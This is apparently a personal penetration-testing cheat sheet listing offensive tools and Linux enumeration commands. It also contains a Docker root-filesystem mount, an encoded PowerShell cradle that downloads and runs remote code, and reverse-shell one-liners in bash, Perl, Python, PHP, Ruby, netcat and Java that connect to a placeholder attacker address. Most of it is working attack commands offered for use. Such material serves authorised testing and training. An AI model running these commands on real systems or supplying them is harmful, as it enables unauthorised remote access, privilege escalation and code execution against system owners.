# pentest
Some useful pentest tools

# LINKS
scapy

https://github.com/internetwache/GitTools

https://github.com/Hackplayers/evil-winrm

https://github.com/byt3bl33d3r/CrackMapExec

https://unix.stackexchange.com/questions/116191/give-server-access-to-internet-via-client-connecting-by-ssh

showmount (nfs-common)

hashcat

nishang (example windows rev shell)

https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite

rouge potato (windows privesc, do whoami /all then check for SeImpersonatePrivilege Enabled)

steghide (stenography in images)

wpscan (wordpress)

https://gchq.github.io/CyberChef/

cewl and crunch

hydra

gobuster

sqlmap

gopher (protocol smuggling)

exiftool

nasm (find JMP ESP address)

ghidra (rev engineering)

immunity debugger (rev engineering)


# ENUMERATION
1. sudo -l
2. check all config files, specially mysql creds...
3. check ls -al /etc/passwd -- cat /etc/passwd
4. find / -perm /5000 2>/dev/null ; find / -perm /4000 2>/dev/null
5. pspy for finding cron tasks
6. writable files


# SUID
https://gtfobins.github.io/


# DOCKER
docker run -it -v /:/mnt ubuntu


# WINDOWS
echo "IEX(New-Object Net.WebClient).downloadString('http://<ip>:<port>/')" | iconv -t utf-16le | base64 -w 0

powershell -enc <result from above cmd>

powershell IWR -Uri http://<ip>:<port>/ -Outfile c:\<file>

powershell Invoke-WebRequest -Uri http://<ip>:<port>/ -Outfile c:\<file>


# STABILIZE SHELL
python -c 'import pty;pty.spawn("/bin/bash")'

control + z

stty raw -echo

fg

export TERM=xterm


# BUFFER OVERFLOW
https://tryhackme.com/room/bufferoverflowprep 

https://esseum.com/win-32-buffer-overflow-walkthrough-exploiting-slmail-5-5/

https://www.youtube.com/watch?v=8ZnmA4KH4bY&feature=youtu.be

https://www.youtube.com/playlist?list=PLLKT__MCUeix3O0DPbmuaRuR_4Hxo4m3G


# REVERSE SHELLS
http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet

Bash:

bash -i >& /dev/tcp/10.0.0.1/8080 0>&1

Perl:

perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

Python:

python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

PHP:

php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'

Ruby:

ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'

Netcat:

nc -e /bin/sh 10.0.0.1 1234

Java:

r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()